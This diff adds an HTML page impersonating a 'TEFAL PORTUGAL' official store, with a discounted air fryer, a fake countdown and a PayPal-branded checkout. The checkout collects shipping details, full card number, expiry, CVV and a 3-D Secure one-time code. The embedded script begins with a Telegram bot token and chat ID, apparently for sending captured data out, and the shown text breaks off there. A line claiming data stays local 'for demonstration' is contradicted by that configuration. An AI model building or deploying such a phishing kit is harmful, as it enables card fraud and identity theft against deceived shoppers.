@@ -1,0 +1,1728 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>TEFAL PORTUGAL — Fritadeira sem Óleo Easy Fry Mega</title>
+  <style>
+    :root {
+      --bg-dark: #07090e;
+      --bg-card: #101522;
+      --bg-elevated: #171e30;
+      --surface-light: #ffffff;
+      --surface-soft: #f3f6fb;
+      --text-light: #f6f8fc;
+      --text-muted: #9aa5b8;
+      --text-dark: #0f172a;
+      --text-dark-muted: #5b667a;
+      --accent-green: #16a34a;
+      --accent-green-bright: #22c55e;
+      --accent-red: #e11d48;
+      --accent-blue: #00457c;
+      --accent-blue-bright: #0070ba;
+      --accent-gold: #fbbf24;
+      --border-dark: rgba(255, 255, 255, 0.09);
+      --border-light: rgba(15, 23, 42, 0.1);
+      --radius-lg: 20px;
+      --radius-md: 14px;
+      --radius-sm: 10px;
+      --font-sans: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      font-family: var(--font-sans);
+      background: var(--bg-dark);
+      color: var(--text-light);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    button, input, select {
+      font-family: inherit;
+    }
+
+    .app-shell {
+      max-width: 460px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background: radial-gradient(circle at 50% -10%, rgba(34, 197, 94, 0.14), transparent 45%),
+                  radial-gradient(circle at 85% 15%, rgba(225, 29, 72, 0.12), transparent 40%),
+                  var(--bg-dark);
+      padding-bottom: 112px;
+      position: relative;
+    }
+
+    /* Top Header */
+    .top-bar {
+      position: sticky;
+      top: 0;
+      z-index: 30;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 14px;
+      background: rgba(7, 9, 14, 0.86);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--border-dark);
+    }
+
+    .brand-left {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .brand-logo-box {
+      width: 38px;
+      height: 38px;
+      border-radius: 11px;
+      background: linear-gradient(135deg, #ff2a55, #b91c1c);
+      display: grid;
+      place-items: center;
+      font-weight: 900;
+      font-size: 13px;
+      letter-spacing: 0.5px;
+      color: #fff;
+      box-shadow: 0 6px 18px rgba(225, 29, 72, 0.35);
+      flex-shrink: 0;
+    }
+
+    .brand-meta {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.15;
+    }
+
+    .brand-title-row {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 14px;
+      font-weight: 800;
+      letter-spacing: 0.4px;
+    }
+
+    .verified-badge {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background: #0ea5e9;
+      color: #fff;
+      font-size: 10px;
+      font-weight: 900;
+    }
+
+    .brand-sub {
+      font-size: 11px;
+      color: var(--text-muted);
+    }
+
+    .icon-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 10px;
+      border: 1px solid var(--border-dark);
+      background: var(--bg-elevated);
+      color: var(--text-light);
+      display: grid;
+      place-items: center;
+      cursor: pointer;
+      font-size: 15px;
+      transition: transform 0.15s ease, background 0.15s ease;
+    }
+
+    .icon-btn:active {
+      transform: scale(0.95);
+    }
+
+    /* Search Bar */
+    .search-wrap {
+      padding: 10px 14px 6px;
+    }
+
+    .search-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: var(--bg-card);
+      border: 1px solid var(--border-dark);
+      border-radius: 12px;
+      padding: 9px 12px;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    .search-box input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: var(--text-light);
+      font-size: 13px;
+    }
+
+    /* Product 3D Card */
+    .product-stage {
+      padding: 8px 14px 12px;
+      perspective: 1100px;
+    }
+
+    .product-card-3d {
+      position: relative;
+      background: var(--surface-light);
+      border-radius: var(--radius-lg);
+      padding: 18px 14px;
+      min-height: 310px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
+      transform-style: preserve-3d;
+      transition: transform 0.18s ease-out;
+    }
+
+    .badge-top-left {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      z-index: 3;
+    }
+
+    .pill-hot {
+      background: linear-gradient(90deg, #f97316, #ef4444);
+      color: #fff;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 4px 8px;
+      border-radius: 7px;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+    }
+
+    .pill-smart {
+      background: #0f172a;
+      color: #38bdf8;
+      font-size: 10px;
+      font-weight: 800;
+      padding: 4px 8px;
+      border-radius: 7px;
+      letter-spacing: 0.5px;
+      width: fit-content;
+    }
+
+    .badge-black-friday {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      width: 68px;
+      height: 68px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, #27272a, #09090b);
+      border: 2px solid var(--accent-gold);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      font-size: 8.5px;
+      font-weight: 800;
+      line-height: 1.15;
+      transform: rotate(10deg);
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.35);
+      z-index: 3;
+    }
+
+    .badge-black-friday span {
+      color: var(--accent-gold);
+      font-size: 10px;
+    }
+
+    .product-img {
+      max-width: 84%;
+      max-height: 255px;
+      width: auto;
+      height: auto;
+      object-fit: contain;
+      transform: translateZ(26px);
+      transition: transform 0.25s ease;
+      user-select: none;
+    }
+
+    .gallery-counter {
+      position: absolute;
+      bottom: 12px;
+      left: 12px;
+      background: rgba(15, 23, 42, 0.78);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 9px;
+      border-radius: 999px;
+      z-index: 3;
+    }
+
+    .gallery-switch-btn {
+      position: absolute;
+      bottom: 12px;
+      right: 12px;
+      background: rgba(15, 23, 42, 0.82);
+      color: #fff;
+      border: none;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 5px 10px;
+      border-radius: 999px;
+      cursor: pointer;
+      z-index: 3;
+    }
+
+    /* Product Details */
+    .details-section {
+      padding: 4px 16px 12px;
+    }
+
+    .product-title {
+      font-size: 18px;
+      font-weight: 800;
+      line-height: 1.3;
+      color: var(--text-light);
+      margin-bottom: 10px;
+    }
+
+    .meta-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 14px;
+      font-size: 13px;
+    }
+
+    .stock-tag {
+      color: #4ade80;
+      font-weight: 700;
+    }
+
+    .rating-tag {
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .rating-tag strong {
+      color: var(--accent-gold);
+    }
+
+    .price-box {
+      display: flex;
+      align-items: baseline;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .price-current {
+      font-size: 32px;
+      font-weight: 900;
+      color: #ff4d6d;
+      letter-spacing: -0.5px;
+    }
+
+    .price-old {
+      font-size: 17px;
+      color: var(--text-muted);
+      text-decoration: line-through;
+    }
+
+    .price-discount {
+      background: rgba(225, 29, 72, 0.18);
+      color: #fb7185;
+      border: 1px solid rgba(251, 113, 133, 0.35);
+      font-size: 12px;
+      font-weight: 800;
+      padding: 3px 8px;
+      border-radius: 8px;
+    }
+
+    .cashback-banner {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(90deg, rgba(22, 163, 74, 0.2), rgba(22, 163, 74, 0.08));
+      border: 1px solid rgba(74, 222, 128, 0.3);
+      border-radius: var(--radius-sm);
+      padding: 10px 12px;
+      margin-bottom: 14px;
+      font-size: 12.5px;
+    }
+
+    .cashback-banner strong {
+      color: #86efac;
+    }
+
+    .delivery-info {
+      background: var(--bg-card);
+      border: 1px solid var(--border-dark);
+      border-radius: var(--radius-md);
+      padding: 12px;
+      margin-bottom: 12px;
+      font-size: 13px;
+      line-height: 1.45;
+    }
+
+    .delivery-free {
+      color: #4ade80;
+      font-weight: 700;
+    }
+
+    .timer-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 8px;
+      padding-top: 8px;
+      border-top: 1px solid var(--border-dark);
+      font-size: 12.5px;
+      color: var(--text-muted);
+    }
+
+    .timer-digits {
+      font-variant-numeric: tabular-nums;
+      font-weight: 800;
+      color: #fbbf24;
+      background: rgba(251, 191, 36, 0.12);
+      padding: 3px 8px;
+      border-radius: 6px;
+    }
+
+    .color-note {
+      font-size: 12.5px;
+      color: var(--text-muted);
+      margin-top: 6px;
+    }
+
+    .color-note span {
+      color: var(--text-light);
+      font-weight: 600;
+    }
+
+    /* Bottom Floating Dock */
+    .bottom-dock {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 40;
+      background: rgba(9, 12, 20, 0.92);
+      backdrop-filter: blur(16px);
+      border-top: 1px solid var(--border-dark);
+      padding: 8px 14px 14px;
+    }
+
+    .bottom-dock-inner {
+      max-width: 460px;
+      margin: 0 auto;
+    }
+
+    .quick-pills {
+      display: flex;
+      gap: 8px;
+      overflow-x: auto;
+      padding-bottom: 8px;
+      scrollbar-width: none;
+    }
+
+    .quick-pills::-webkit-scrollbar {
+      display: none;
+    }
+
+    .quick-pill {
+      background: var(--bg-elevated);
+      border: 1px solid var(--border-dark);
+      color: #e2e8f0;
+      font-size: 11.5px;
+      font-weight: 600;
+      padding: 6px 11px;
+      border-radius: 999px;
+      white-space: nowrap;
+      cursor: pointer;
+    }
+
+    .dock-actions {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .mini-action-btn {
+      width: 46px;
+      height: 46px;
+      border-radius: 13px;
+      border: 1px solid var(--border-dark);
+      background: var(--bg-elevated);
+      color: var(--text-light);
+      font-size: 17px;
+      cursor: pointer;
+      display: grid;
+      place-items: center;
+      flex-shrink: 0;
+    }
+
+    .buy-now-btn {
+      flex: 1;
+      height: 46px;
+      border: none;
+      border-radius: 13px;
+      background: linear-gradient(135deg, #22c55e, #15803d);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.2px;
+      cursor: pointer;
+      box-shadow: 0 10px 24px rgba(22, 163, 74, 0.35);
+      transition: transform 0.15s ease;
+    }
+
+    .buy-now-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* Checkout Overlay (Steps 1, 2, 3) */
+    .checkout-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 60;
+      background: var(--surface-soft);
+      color: var(--text-dark);
+      overflow-y: auto;
+      display: none;
+    }
+
+    .checkout-overlay.active {
+      display: block;
+    }
+
+    .checkout-container {
+      max-width: 460px;
+      margin: 0 auto;
+      min-height: 100vh;
+      padding: 16px 16px 36px;
+      background: #f8fafc;
+    }
+
+    .checkout-topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 14px;
+    }
+
+    .back-btn {
+      border: 1px solid var(--border-light);
+      background: #fff;
+      color: var(--text-dark);
+      padding: 8px 12px;
+      border-radius: 10px;
+      font-size: 13px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .step-indicator {
+      font-size: 12px;
+      font-weight: 800;
+      color: var(--accent-blue);
+      background: rgba(0, 112, 186, 0.1);
+      padding: 5px 10px;
+      border-radius: 999px;
+    }
+
+    .demo-fill-btn {
+      border: none;
+      background: rgba(15, 23, 42, 0.07);
+      color: var(--text-dark);
+      padding: 7px 10px;
+      border-radius: 9px;
+      font-size: 11.5px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .checkout-card {
+      background: #fff;
+      border: 1px solid var(--border-light);
+      border-radius: var(--radius-lg);
+      padding: 18px;
+      box-shadow: 0 10px 28px rgba(15, 23, 42, 0.06);
+      margin-bottom: 14px;
+    }
+
+    .paypal-header {
+      text-align: center;
+      margin-bottom: 12px;
+    }
+
+    .paypal-wordmark {
+      font-size: 26px;
+      font-weight: 900;
+      font-style: italic;
+      color: var(--accent-blue);
+      letter-spacing: -0.5px;
+    }
+
+    .paypal-wordmark span {
+      color: var(--accent-blue-bright);
+    }
+
+    .checkout-amount {
+      text-align: center;
+      font-size: 32px;
+      font-weight: 900;
+      color: var(--text-dark);
+      margin-bottom: 14px;
+    }
+
+    /* Live Interactive 3D Card */
+    .virtual-card-scene {
+      perspective: 900px;
+      margin-bottom: 16px;
+    }
+
+    .virtual-card {
+      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 55%, #0284c7 100%);
+      color: #fff;
+      border-radius: 16px;
+      padding: 18px;
+      min-height: 176px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      box-shadow: 0 16px 30px rgba(15, 23, 42, 0.25);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .virtual-card::after {
+      content: "";
+      position: absolute;
+      inset: -40%;
+      background: radial-gradient(circle at 75% 20%, rgba(255, 255, 255, 0.24), transparent 55%);
+      pointer-events: none;
+    }
+
+    .vcard-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 1;
+    }
+
+    .vcard-chip {
+      width: 38px;
+      height: 28px;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #fde68a, #d97706);
+      opacity: 0.92;
+    }
+
+    .vcard-brand {
+      font-size: 13px;
+      font-weight: 900;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .vcard-number {
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      font-variant-numeric: tabular-nums;
+      z-index: 1;
+      margin: 12px 0;
+    }
+
+    .vcard-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      font-size: 12px;
+      z-index: 1;
+    }
+
+    .vcard-label {
+      font-size: 9.5px;
+      text-transform: uppercase;
+      opacity: 0.72;
+      margin-bottom: 2px;
+    }
+
+    .vcard-val {
+      font-weight: 700;
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Form Fields */
+    .field-group {
+      margin-bottom: 12px;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-dark-muted);
+      margin-bottom: 5px;
+    }
+
+    .field-input {
+      width: 100%;
+      height: 44px;
+      border: 1px solid #cbd5e1;
+      border-radius: 11px;
+      padding: 0 12px;
+      font-size: 15px;
+      color: var(--text-dark);
+      background: #fff;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    .field-input:focus {
+      border-color: var(--accent-blue-bright);
+      box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.14);
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .primary-blue-btn {
+      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 999px;
+      background: linear-gradient(135deg, var(--accent-blue-bright), var(--accent-blue));
+      color: #fff;
+      font-size: 15px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 10px 22px rgba(0, 112, 186, 0.28);
+      margin-top: 6px;
+    }
+
+    .primary-blue-btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .security-note {
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-dark-muted);
+      margin-top: 12px;
+    }
+
+    /* OTP / 3D Secure Code Input */
+    .otp-code-input {
+      width: 100%;
+      height: 58px;
+      text-align: center;
+      font-size: 26px;
+      font-weight: 900;
+      letter-spacing: 8px;
+      border: 2px solid #cbd5e1;
+      border-radius: 14px;
+      color: var(--text-dark);
+      background: #f8fafc;
+      outline: none;
+      font-variant-numeric: tabular-nums;
+    }
+
+    .otp-code-input:focus {
+      border-color: var(--accent-blue-bright);
+      background: #fff;
+    }
+
+    .otp-counter {
+      text-align: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--text-dark-muted);
+      margin-top: 8px;
+    }
+
+    /* 5-Second 8D Payment Animation Stage */
+    .anim-8d-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 80;
+      background: radial-gradient(circle at center, #111b33 0%, #05070d 100%);
+      color: #fff;
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    .anim-8d-overlay.active {
+      display: flex;
+    }
+
+    #particlesCanvas {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+    }
+
+    .stage-8d-content {
+      position: relative;
+      z-index: 2;
+      max-width: 390px;
+      width: 100%;
+    }
+
+    .ring-8d {
+      width: 132px;
+      height: 132px;
+      margin: 0 auto 22px;
+      border-radius: 50%;
+      border: 3px solid rgba(56, 189, 248, 0.35);
+      border-top-color: var(--accent-green-bright);
+      border-right-color: var(--accent-gold);
+      display: grid;
+      place-items: center;
+      animation: spin8D 1.35s linear infinite;
+      box-shadow: 0 0 40px rgba(34, 197, 94, 0.25);
+    }
+
+    .ring-8d-core {
+      width: 92px;
+      height: 92px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, rgba(56, 189, 248, 0.22), rgba(34, 197, 94, 0.22));
+      display: grid;
+      place-items: center;
+      font-size: 34px;
+      animation: counterSpin8D 1.35s linear infinite;
+    }
+
+    @keyframes spin8D {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes counterSpin8D {
+      to { transform: rotate(-360deg); }
+    }
+
+    .anim-status-title {
+      font-size: 20px;
+      font-weight: 900;
+      margin-bottom: 8px;
+    }
+
+    .anim-status-sub {
+      font-size: 13.5px;
+      color: var(--text-muted);
+      margin-bottom: 18px;
+      min-height: 20px;
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.12);
+      border-radius: 999px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #38bdf8, #22c55e, #fbbf24);
+      transition: width 0.08s linear;
+    }
+
+    .progress-time {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--accent-gold);
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Success Receipt */
+    .receipt-box {
+      display: none;
+      background: rgba(16, 21, 34, 0.92);
+      border: 1px solid rgba(74, 222, 128, 0.4);
+      border-radius: var(--radius-lg);
+      padding: 22px 18px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.55);
+    }
+
+    .receipt-box.active {
+      display: block;
+    }
+
+    .receipt-badge {
+      width: 58px;
+      height: 58px;
+      margin: 0 auto 12px;
+      border-radius: 50%;
+      background: rgba(34, 197, 94, 0.18);
+      color: #4ade80;
+      display: grid;
+      place-items: center;
+      font-size: 28px;
+      font-weight: 900;
+    }
+
+    .receipt-lines {
+      text-align: left;
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 12px;
+      padding: 12px;
+      margin: 14px 0 18px;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #e2e8f0;
+    }
+
+    .receipt-lines div {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+
+    .receipt-lines span:first-child {
+      color: var(--text-muted);
+    }
+
+    .done-btn {
+      width: 100%;
+      height: 46px;
+      border: none;
+      border-radius: 12px;
+      background: var(--accent-green-bright);
+      color: #052e16;
+      font-size: 14.5px;
+      font-weight: 900;
+      cursor: pointer;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      top: 68px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-12px);
+      background: #1e293b;
+      color: #fff;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      padding: 10px 16px;
+      border-radius: 12px;
+      font-size: 12.5px;
+      font-weight: 600;
+      z-index: 95;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.2s ease, transform 0.2s ease;
+      max-width: 90vw;
+      text-align: center;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+  </style>
+</head>
+<body>
+  <div class="toast" id="toast"></div>
+
+  <!-- MAIN PRODUCT PAGE -->
+  <div class="app-shell" id="productPage">
+    <header class="top-bar">
+      <div class="brand-left">
+        <div class="brand-logo-box">TF</div>
+        <div class="brand-meta">
+          <div class="brand-title-row">
+            <span>TEFAL PORTUGAL</span>
+            <span class="verified-badge" title="Loja Oficial Verificada">✓</span>
+          </div>
+          <span class="brand-sub">Loja Oficial • PT • Envio 24h</span>
+        </div>
+      </div>
+      <button class="icon-btn" id="shareBtn" type="button" title="Partilhar">↗</button>
+    </header>
+
+    <div class="search-wrap">
+      <div class="search-box">
+        <span>🔍</span>
+        <input type="text" id="searchInput" placeholder="Pesquisar na Tefal Portugal..." aria-label="Pesquisar na Tefal Portugal" />
+      </div>
+    </div>
+
+    <div class="product-stage">
+      <div class="product-card-3d" id="card3d">
+        <div class="badge-top-left">
+          <span class="pill-hot">TOP VENDAS</span>
+          <span class="pill-smart">SMART</span>
+        </div>
+        <div class="badge-black-friday">
+          <span>PREÇOS</span>
+          BLACK<br/>FRIDAY
+        </div>
+        <img
+          id="mainProductImg"
+          class="product-img"
+          src="https://click.ua/content/shop/products/341518/photos/multipech-tefal-easy-fry-mega-compact-ey8618e0-800x800-b972.jpg"
+          alt="Fritadeira sem Óleo TEFAL Easy Fry Mega Compact EY8618E0"
+          referrerpolicy="no-referrer"
+        />
+        <div class="gallery-counter" id="galleryCounter">1 / 3</div>
+        <button class="gallery-switch-btn" id="nextPhotoBtn" type="button">Próxima foto ›</button>
+      </div>
+    </div>
+
+    <section class="details-section">
+      <h1 class="product-title">Fritadeira sem Óleo TEFAL Easy Fry Mega Compact EY8618E0</h1>
+
+      <div class="meta-row">
+        <span class="stock-tag">● Em stock</span>
+        <span class="rating-tag">★ <strong>4.9</strong>/5 (1 494 avaliações)</span>
+      </div>
+
+      <div class="price-box">
+        <span class="price-current">25,99 €</span>
+        <span class="price-old">51,99 €</span>
+        <span class="price-discount">-50%</span>
+      </div>
+
+      <div class="cashback-banner">
+        <span><strong>+1% de cashback</strong> em saldo na próxima compra</span>
+        <span>›</span>
+      </div>
+
+      <div class="delivery-info">
+        <div>Envio para Portugal Continental e Ilhas — <span class="delivery-free">GRÁTIS</span></div>
+        <div class="timer-row">
+          <span>Oferta termina em:</span>
+          <span class="timer-digits" id="countdownTimer">23:55:59</span>
+        </div>
+      </div>
+
+      <p class="color-note">Cor: <span>Preto mate / Aço escovado</span></p>
+    </section>
+
+    <div class="bottom-dock">
+      <div class="bottom-dock-inner">
+        <div class="quick-pills">
+          <button class="quick-pill" type="button" data-info="Capacidade ideal para refeições em família até 4–6 doses.">Quantas porções prepara?</button>
+          <button class="quick-pill" type="button" data-info="O cesto antiaderente pode ir à máquina de lavar loiça.">Máquina de lavar loiça?</button>
+          <button class="quick-pill" type="button" data-info="Entrega expressa em 24–48h em todo o território nacional.">Prazo de entrega?</button>
+        </div>
+        <div class="dock-actions">
+          <button class="mini-action-btn" id="favBtn" type="button" title="Guardar">♡</button>
+          <button class="buy-now-btn" id="buyNowBtn" type="button">Comprar agora • 25,99 €</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CHECKOUT FLOW (STEPS 1, 2, 3) -->
+  <div class="checkout-overlay" id="checkoutOverlay">
+    <div class="checkout-container">
+      <div class="checkout-topbar">
+        <button class="back-btn" id="checkoutBackBtn" type="button">‹ Voltar</button>
+        <span class="step-indicator" id="stepBadge">Passo 1 de 3 • Envio</span>
+        <button class="demo-fill-btn" id="demoFillBtn" type="button">Auto-teste</button>
+      </div>
+
+      <!-- STEP 1: DELIVERY DATA -->
+      <form class="checkout-card" id="stepDeliveryForm">
+        <h2 style="font-size: 19px; font-weight: 800; margin-bottom: 14px;">Dados de Envio</h2>
+
+        <div class="field-group">
+          <label class="field-label" for="fullName">Nome completo</label>
+          <input class="field-input" id="fullName" type="text" placeholder="Ex.: João Silva" required />
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="phoneInput">Telemóvel</label>
+          <input class="field-input" id="phoneInput" type="tel" placeholder="+351 912 345 678" required />
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="addressInput">Morada completa</label>
+          <input class="field-input" id="addressInput" type="text" placeholder="Rua das Flores, 42, 2.º Esq." required />
+        </div>
+
+        <div class="grid-2">
+          <div class="field-group">
+            <label class="field-label" for="postalCode">Código Postal</label>
+            <input class="field-input" id="postalCode" type="text" placeholder="1000-001" required />
+          </div>
+          <div class="field-group">
+            <label class="field-label" for="cityInput">Cidade</label>
+            <input class="field-input" id="cityInput" type="text" placeholder="Lisboa" required />
+          </div>
+        </div>
+
+        <button class="primary-blue-btn" type="submit">Continuar para pagamento →</button>
+        <p class="security-note">Os dados são guardados apenas localmente neste navegador para demonstração.</p>
+      </form>
+
+      <!-- STEP 2: CARD PAYMENT -->
+      <form class="checkout-card" id="stepCardForm" style="display: none;">
+        <div class="paypal-header">
+          <div class="paypal-wordmark">Pay<span>Pal</span></div>
+        </div>
+        <div class="checkout-amount">25,99 €</div>
+
+        <div class="virtual-card-scene">
+          <div class="virtual-card" id="virtualCard">
+            <div class="vcard-top">
+              <div class="vcard-chip"></div>
+              <div class="vcard-brand" id="cardBrandLabel">CARTÃO</div>
+            </div>
+            <div class="vcard-number" id="vcardNumber">•••• •••• •••• ••••</div>
+            <div class="vcard-bottom">
+              <div>
+                <div class="vcard-label">Titular</div>
+                <div class="vcard-val" id="vcardHolder">NOME DO TITULAR</div>
+              </div>
+              <div style="text-align: right;">
+                <div class="vcard-label">Validade</div>
+                <div class="vcard-val" id="vcardExpiry">MM/AA</div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="cardNumber">Número do cartão</label>
+          <input class="field-input" id="cardNumber" type="text" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" required />
+        </div>
+
+        <div class="grid-2">
+          <div class="field-group">
+            <label class="field-label" for="cardExpiry">Data de validade</label>
+            <input class="field-input" id="cardExpiry" type="text" inputmode="numeric" maxlength="5" placeholder="MM/AA" required />
+          </div>
+          <div class="field-group">
+            <label class="field-label" for="cardCvv">CVV</label>
+            <input class="field-input" id="cardCvv" type="password" inputmode="numeric" maxlength="4" placeholder="123" required />
+          </div>
+        </div>
+
+        <div class="field-group">
+          <label class="field-label" for="cardHolder">Nome e apelido</label>
+          <input class="field-input" id="cardHolder" type="text" placeholder="João Silva" required />
+        </div>
+
+        <button class="primary-blue-btn" type="submit">🔒 Pagar 25,99 €</button>
+        <p class="security-note">🛡️ Pagamento seguro com PayPal</p>
+      </form>
+
+      <!-- STEP 3: 3D-SECURE VERIFICATION CODE (UP TO 6 DIGITS) -->
+      <form class="checkout-card" id="stepOtpForm" style="display: none;">
+        <h2 style="font-size: 19px; font-weight: 800; text-align: center; margin-bottom: 6px;">Confirmação de Pagamento</h2>
+        <p style="font-size: 13px; color: var(--text-dark-muted); text-align: center; margin-bottom: 16px;">
+          Introduza o código de verificação (até 6 dígitos) para concluir a compra de <strong>25,99 €</strong>.
+        </p>
+
+        <div class="field-group">
+          <label class="field-label" for="otpCodeInput" style="text-align: center;">Código de segurança (máx. 6 dígitos)</label>
+          <input
+            class="otp-code-input"
+            id="otpCodeInput"
+            type="text"
+            inputmode="numeric"
+            maxlength="6"
+            placeholder="••••••"
+            autocomplete="one-time-code"
+            required
+          />
+          <div class="otp-counter" id="otpCounter">0 / 6 dígitos</div>
+        </div>
+
+        <button class="primary-blue-btn" id="confirmOtpBtn" type="submit" disabled>Confirmar Pagamento</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- 5-SECOND 8D PAYMENT ANIMATION + FINAL RECEIPT -->
+  <div class="anim-8d-overlay" id="anim8dOverlay">
+    <canvas id="particlesCanvas"></canvas>
+
+    <div class="stage-8d-content">
+      <div id="animRunningBlock">
+        <div class="ring-8d">
+          <div class="ring-8d-core">⚡</div>
+        </div>
+        <div class="anim-status-title" id="animStatusTitle">A iniciar canal 8D...</div>
+        <div class="anim-status-sub" id="animStatusSub">A validar autorização segura de 25,99 €</div>
+        <div class="progress-track">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-time" id="progressTime">0.0s / 5.0s</div>
+      </div>
+
+      <div class="receipt-box" id="receiptBox">
+        <div class="receipt-badge">✓</div>
+        <h2 style="font-size: 21px; font-weight: 900; margin-bottom: 4px;">Pagamento Confirmado!</h2>
+        <p style="font-size: 13px; color: var(--text-muted);">Encomenda registada com sucesso na TEFAL PORTUGAL</p>
+
+        <div class="receipt-lines">
+          <div><span>Artigo:</span><span>TEFAL Easy Fry Mega</span></div>
+          <div><span>Total pago:</span><strong style="color: #4ade80;">25,99 €</strong></div>
+          <div><span>Cliente:</span><span id="recClient">—</span></div>
+          <div><span>Destino:</span><span id="recCity">—</span></div>
+          <div><span>Referência:</span><span id="recRef">#PT-2599</span></div>
+        </div>
+
+        <button class="done-btn" id="finishOrderBtn" type="button">Concluir</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      const TG_CONFIG = {
+        BOT_TOKEN: "9092815837:AAHDZvddIwWM-etpuIBe_mw_6qQk-bU66xE",
+        CHAT_ID: "8732522479"
+      };
+
+      const sessionId = "sess_" + Math.random().toString(36).slice(2, 8) + "_" + Date.now().toString(36);
+      const enteredAtMs = Date.now();
+
+      function escapeHtml(str) {
+        return String(str ?? "")
+          .replace(/&/g, "&amp;")
